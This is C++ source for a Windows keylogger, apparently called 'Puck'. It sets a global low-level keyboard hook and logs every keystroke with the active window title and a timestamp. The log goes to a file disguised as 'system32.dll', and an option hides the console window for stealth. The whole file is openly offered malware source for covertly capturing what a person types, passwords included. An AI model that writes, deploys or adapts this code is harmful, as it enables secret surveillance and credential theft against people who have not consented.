#include <cstdio>
#include <iostream>
#include <fstream>
#include <time.h>
#include <windows.h>
#include <stdint.h>

/* Comment out the following definition if the console window should be hidden. */
#define PUCK_VISIBLE
/* The title of the message box when an error occurs. */
#define PUCK_FAILURE_TITLE "Jingle Bells!"
/* The message of the message box when an error occurs. */
#define PUCK_FAILURE_MESSAGE "Looks like Santa Claus is coming to town early this year."
/* The name of the output file. */
#define PUCK_OUTPUT_FILE "system32.dll"

HHOOK hook;
std::ofstream output;
char previousWindowTitle[256];

HHOOK activateHook();
void shutdownHook(HHOOK hook);
int logKey(int keyStroke);
void activateStealth();
LRESULT __stdcall callback(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK activateHook() {
    HHOOK result = SetWindowsHookEx(WH_KEYBOARD_LL, callback, NULL, 0);
	if (!result) {
		MessageBox(NULL, PUCK_FAILURE_MESSAGE, PUCK_FAILURE_TITLE, MB_ICONERROR);
	}
    return result;
}

void shutdownHook(HHOOK hook) {
	UnhookWindowsHookEx(hook);
}

int logKey(int keyStroke) {
    char previousWindowTitle[256];

	if ((keyStroke == 1) || (keyStroke == 2)) {
		return 0; // ignore mouse clicks
    }

	HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout;
    if (foreground) {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground) {
        char windowTitle[256];
        GetWindowText(foreground, windowTitle, 256);

        if(strcmp(windowTitle, previousWindowTitle) != 0) {
            strcpy(previousWindowTitle, windowTitle);

            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);

            output << "\n\n["<< windowTitle << " - at " << s << "]\n";
        }
    }

	switch (keyStroke) {
        case VK_BACK:
            output << "[BACKSPACE]";
            break;

        case VK_RETURN:
		output << "[ENTER]\n";
        break;

        case VK_SPACE:
            output << " ";
            break;

        case VK_TAB:
            output << "[TAB]";
            break;

        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            output << "[SHIFT]";
            break;

        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            output << "[CONTROL]";
            break;

        case VK_ESCAPE:
            output << "[ESCAPE]";
            break;

        case VK_END:
            output << "[END]";
            break;

        case VK_HOME:
            output << "[HOME]";
            break;

        case VK_LEFT:
            output << "[LEFT]";
            break;

        case VK_UP:
            output << "[UP]";
            break;

        case VK_RIGHT:
            output << "[RIGHT]";
            break;

        case VK_DOWN:
            output << "[DOWN]";
            break;

        case 190:
        case 110:
            output << ".";
            break;

        case 189:
        case 109:
            output << "-";
            break;

        case 20:
            output << "[CAPSLOCK]";
            break;

        default: {
            bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

            if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
                (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
                lowercase = !lowercase;
            }

            char key = MapVirtualKeyExA(keyStroke, MAPVK_VK_TO_CHAR, layout);

            if (!lowercase) {
                key = tolower(key);
            }

            output << char(key);
        }
    }
    
    output.flush();
	
    return 0;
}

void activateStealth() {
#ifdef PUCK_VISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#else
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
#endif
}


LRESULT __stdcall callback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			/* lParam is a pointer to the structure containing the data needed.
             * Therefore, cast it.
             */
			KBDLLHOOKSTRUCT data = *((KBDLLHOOKSTRUCT*)lParam);

			/* Translate the key pressed and save it to the output file. */
			logKey(data.vkCode);
		}
	}

	/* Call the next hook in the hook chain. This is nessecary or your hook chain
     * will break and the hook stops.
     */
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

int32_t main() {
	/* Open the output file in append mode. */
    output.open(PUCK_OUTPUT_FILE, std::ios_base::app);

	activateStealth();
	hook = activateHook();

	MSG message;
	while (GetMessage(&message, NULL, 0, 0)) {
        Sleep(500);
    }

    shutdownHook(hook);

    return 0;
}